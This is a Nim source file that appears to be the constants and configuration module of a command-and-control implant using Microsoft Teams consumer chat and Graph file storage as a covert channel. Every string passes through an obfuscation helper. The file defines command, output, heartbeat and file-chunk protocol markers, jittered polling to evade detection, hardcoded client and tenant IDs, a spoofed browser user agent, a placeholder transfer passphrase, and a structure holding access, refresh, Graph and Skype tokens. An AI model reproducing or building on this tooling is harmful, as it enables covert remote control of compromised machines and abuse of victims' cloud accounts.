

import obfuscation


proc CMD_START*(): string  = s("##CMD##")
proc CMD_END*():   string  = s("##END##")
proc OUT_START*(): string  = s("##OUT##")
proc OUT_END*():   string  = s("##END##")
proc ERR_START*(): string  = s("##ERR##")
proc ERR_END*():   string  = s("##END##")
proc HB_START*():  string  = s("##HB##")
proc HB_END*():    string  = s("##END##")
proc BLOB_START*():  string = s("##BLOB##")
proc BLOB_END*():    string = s("##END##")
proc CHUNK_START*():        string = s("##CHUNK##")        ## Server -> Client: file chunk data
proc CHUNK_END*():          string = s("##END##")
proc CHUNK_START_MARKER*(): string = s("##CHUNK_START##")  ## Server -> Client: begin transfer (<name>|<total>)
proc CHUNK_DONE*():         string = s("##CHUNK_DONE##")   ## Server -> Client: all chunks sent (<name>)



const
  POLL_BASE*   = 8    ## base poll interval in seconds
  POLL_JITTER* = 4    ## jitter in seconds
  HB_BASE*     = 60   ## base heartbeat interval in seconds
  HB_JITTER*   = 20   ## heartbeat jitter in seconds


proc TEAMS_CLIENT_ID*(): string = s("4b3e8f46-56d3-427f-b1e2-d239b2ea6bca")
proc M365_CLIENT_ID*():  string = s("4765445b-32c6-49b0-83e6-1d93765276ca")
proc TEAMS_TENANT*():    string = s("9188040d-6c67-4c5b-b112-36a304b66dad")

proc NONCE*(): string =
  s("639207421960506366.") &
  s("ZWQ2ZDg4ODUtMDU3Ny00NGVkLThjMmMtNmM5M2JjOWUyNTM2") &
  s("OTZlYmVjMTQtMDM3Yi00NzY1LWE0Y2EtYjVkNjA3MTRmOTU1")

const
  MAX_RETRIES*         = 3
  DEFAULT_RETRY_AFTER* = 5



proc USER_AGENT*(): string =
  s("Mozilla/5.0 (Windows NT 10.0; Win64; x64) ") &
  s("AppleWebKit/537.36 (KHTML, like Gecko) ") &
  s("Chrome/150.0.0.0 Safari/537.36")


proc FILE_KEY_PASSPHRASE*(): string = s("C2_FILE_TRANSFER_KEY_2026_CHANGE_ME")


proc URL_MSA_TOKEN*(): string =
  s("https://login.microsoftonline.com/") &
  s("9188040d-6c67-4c5b-b112-36a304b66dad") &
  s("/oauth2/v2.0/token")

proc URL_MSA_AUTHORIZE*(): string =
  s("https://login.microsoftonline.com/") &
  s("9188040d-6c67-4c5b-b112-36a304b66dad") &
  s("/oauth2/v2.0/authorize?")

proc URL_TEAMS_BASE*(): string = s("https://teams.live.com")
proc URL_TEAMS_V2*():   string = s("https://teams.live.com/v2/")
proc URL_GRAPH_BASE*(): string = s("https://graph.microsoft.com")

proc URL_LOGIN_COMMON*(): string =
  s("https://login.microsoftonline.com/common/") &
  s("GetCredentialType?mkt=en-US")

proc URL_TEAMS_AUTHZ*(): string =
  s("https://teams.live.com/api/auth/v2.0/authz/consumer")

proc URL_CONSUMERS_TOKEN*(): string =
  s("https://login.microsoftonline.com/consumers/oauth2/v2.0/token")

proc URL_GRAPH_SCOPE*(): string =
  s("https://graph.microsoft.com/Files.ReadWrite openid profile offline_access")

proc URL_TEAMS_THREADS*(): string =
  s("https://teams.live.com/api/chatsvc/consumer/v1/threads")

proc URL_TEAMS_CONVERSATIONS*(): string =
  s("https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations") &
  s("?startTime=0&view=msnp24Equivalent&pageSize=200")

proc URL_TEAMS_CSA*(): string =
  s("https://teams.live.com/api/csa/api/v3/teams/users/me") &
  s("?isPrefetch=false&enableMembershipSummary=true") &
  s("&supportsAdditionalSystemGeneratedFolders=true") &
  s("&enableEngageCommunities=false")


type
  TokenDict* = ref object
    ## All authentication tokens and session state.
    ## Passed by reference between all functions so mutations are visible.
    refreshToken*    : string
    accessToken*     : string
    graphToken*      : string
    skypeToken*      : string
    skypeId*         : string
    displayName*     : string
    oid*             : string
    serverContact*   : string
    onNewLink*       : proc(url: string; contact: string) {.closure.}

proc newTokenDict*(): TokenDict =
  result = TokenDict(
    refreshToken:  "",
    accessToken:   "",
    graphToken:    "",
    skypeToken:    "",
    skypeId:       "",
    displayName:   "",
    oid:           "",
    serverContact: "",
    onNewLink:     nil,
  )
